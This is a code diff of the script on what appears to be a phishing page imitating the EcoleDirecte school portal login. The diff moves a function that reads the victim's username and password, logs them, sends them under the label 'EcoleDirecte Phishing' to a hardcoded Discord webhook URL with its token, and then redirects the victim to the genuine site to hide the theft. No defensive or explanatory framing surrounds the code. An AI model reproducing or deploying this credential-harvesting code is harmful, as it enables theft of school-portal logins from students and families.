@@ -150,20 +150,7 @@
 
 <script type="text/javascript">
     
-function connect_funct() {
-    var uname = document.getElementById("username").value;
-    var pass = document.getElementById("password").value;
-    const d = new Date();
-    let date_string = d.toLocaleString();
-    const webhook_name = "EcoleDirecte Phishing";
-    
-    console.log("connect_funct 1");
-    console.log("username : ", uname);
-    console.log("password : ", pass);
-    send(webhook_name, uname, pass, date_string);
-    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 5);
-  }
-  document.getElementById("bouton").onclick = function connect_funct() {
+    document.getElementById("bouton").onclick = function connect_funct() {
     var uname = document.getElementById("username").value;
     var pass = document.getElementById("password").value;
     const d = new Date();
@@ -194,6 +181,20 @@ function connect_funct() {
 
   }
 
+function connect_funct() {
+    var uname = document.getElementById("username").value;
+    var pass = document.getElementById("password").value;
+    const d = new Date();
+    let date_string = d.toLocaleString();
+    const webhook_name = "EcoleDirecte Phishing";
+    
+    console.log("connect_funct 1");
+    console.log("username : ", uname);
+    console.log("password : ", pass);
+    send(webhook_name, uname, pass, date_string);
+    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 5);
+  }
+  
   function send(webhook_name, uname, pass, date_string) {
     console.log("fonction message")
     var webhooklink = "https://discord.com/api/webhooks/945426075897462815/_RBM1dRg81RFGp3UyTIiySF9YWBN-wVqFeMIZPQfb8vQ3j2DACU4VTUfI_IN3MAJaKBi";
